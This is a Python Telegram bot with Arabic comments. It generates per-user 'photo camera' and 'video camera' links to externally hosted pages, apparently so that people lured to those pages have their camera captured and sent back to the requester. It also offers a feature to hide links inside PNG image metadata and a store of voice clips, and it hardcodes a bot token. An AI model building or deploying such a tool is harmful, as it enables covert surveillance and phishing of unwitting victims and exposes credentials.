import os
import json
import urllib3
import telebot
from telebot import types
from PIL import Image, PngImagePlugin

# إيقاف تحذيرات الشهادات لضمان استقرار الاتصال بالسيرفر
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعداد توكن البوت
BOT_TOKEN = os.getenv("BOT_TOKEN", "8446745973:AAFbl0cHMVXW4ZHvUQHnuWqJjf62597qBl0")
bot = telebot.TeleBot(BOT_TOKEN)

# مسار قاعدة بيانات الأصوات المتوافق مع مسارات السيرفرات السحابية
DB_FILE = "/tmp/voice_db.json" if os.path.exists("/tmp") else "voice_db.json"

PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId/"

user_states = {}
user_data = {}

# --- إدارة قاعدة بيانات الأصوات الآمنة ---
def load_db():
    if not os.path.exists(DB_FILE) or os.path.getsize(DB_FILE) == 0:
        return {}
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try: 
            return json.load(f)
        except Exception: 
            return {}

def save_db(db):
    try:
        dir_name = os.path.dirname(DB_FILE)
        if dir_name and not os.path.exists(dir_name):
            os.makedirs(dir_name, exist_ok=True)
        with open(DB_FILE, 'w', encoding='utf-8') as f: 
            json.dump(db, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"تحذير حفظ قاعدة البيانات: {e}")

# --- دالة حقن الرابط في الصورة ---
def hide_link_in_metadata(image_path, link, output_path):
    try:
        img = Image.open(image_path).convert("RGB")
        meta = PngImagePlugin.PngInfo()
        meta.add_text("URL_LINK", link)
        img.save(output_path, "PNG", pnginfo=meta)
    except Exception as e:
        print(f"خطأ ميتاداتا الصورة: {e}")

# --- لوحة التحكم واجهة البوت ---
def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "المطور سيف الدين يرحب بك 🚀\nالبوت متصل بالخادم ومستعد للعمل الآن!", reply_markup=get_main_keyboard())

# --- معالجة الأزرار والـ Callback ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    db = load_db()

    if call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        bot.edit_message_text("أرسل الصورة الآن لحقن الرابط:", chat_id, call.message.message_id)
    
    elif call.data in ["get_photo_link", "get_video_link"]:
        link = f"{PHOTO_PAGE_URL}?chatId={chat_id}" if call.data == "get_photo_link" else f"{VIDEO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🔗 الرابط المطلوب:\n{link}")
        
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"))
        markup.add(types.InlineKeyboardButton("🔙 عودة للقائمة الرئيسية", callback_data="main_menu"))
        bot.edit_message_text("اختر المجلد المطلوب:", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data == "girl_1_menu":
        if not db:
            bot.answer_callback_query(call.id, "⚠️ لا توجد مقاطع محفوظة حالياً.")
            return
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        for i in range(1, 11):
            name = f"مقطع {i}"
            if name in db:
                markup.add(types.InlineKeyboardButton(name, callback_data=f"play:{name}"))
                
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("📂 مقاطع الفتاة 1 الكاملة:", chat_id, call.message.message_id, reply_markup=markup)
        
    elif call.data == "main_menu":
        bot.edit_message_text("المطور سيف الدين يرحب بك", chat_id, call.message.message_id, reply_markup=get_main_keyboard())

    elif call.data.startswith("play:"):
        name = call.data.split(":")[1]
        file_id = db.get(name)
        if file_id:
            try: 
                bot.send_voice(chat_id, file_id)
            except Exception as e: 
                bot.answer_callback_query(call.id, "❌ حدثت مشكلة في استدعاء الصوت.")
        else:
            bot.answer_callback_query(call.id, "❌ هذا المقطع غير متاح.")

# --- المعالج العام لاستقبال الأصوات والصور ---
@bot.message_handler(content_types=['photo', 'text', 'voice'])
def handle_all(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)

    if message.voice:
        db = load_db()
        current_count = len(db)
        next_slot = current_count + 1
        
        if next_slot > 10:
            db = {}
            next_slot = 1
            
        name = f"مقطع {next_slot}"
        db[name] = message.voice.file_id
        save_db(db)
        bot.reply_to(message, f"✅ تم حفظ وتحديث ({name}) بنجاح!")
    
    elif state == "waiting_for_image_inject" and message.photo:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        img_path = os.path.join("/tmp" if os.path.exists("/tmp") else ".", f"img_{chat_id}.png")
        with open(img_path, 'wb') as f: f.write(downloaded)
        user_data[chat_id] = img_path
        user_states[chat_id] = "waiting_for_link"
        bot.reply_to(message, "تم حفظ الصورة، أرسل الرابط الآن للحقن:")

    elif state == "waiting_for_link" and message.text:
        img_path = user_data.get(chat_id)
        out_path = os.path.join("/tmp" if os.path.exists("/tmp") else ".", f"out_{chat_id}.png")
        hide_link_in_metadata(img_path, message.text, out_path)
        if os.path.exists(out_path):
            with open(out_path, 'rb') as f:
                bot.send_photo(chat_id, f, caption=f"{message.text}")
        user_states[chat_id] = None
        if os.path.exists(img_path): os.remove(img_path)
        if os.path.exists(out_path): os.remove(out_path)

if __name__ == '__main__':
    print("🚀 تم تشغيل البوت بنجاح...")
    bot.polling(none_stop=True, interval=0, timeout=40)
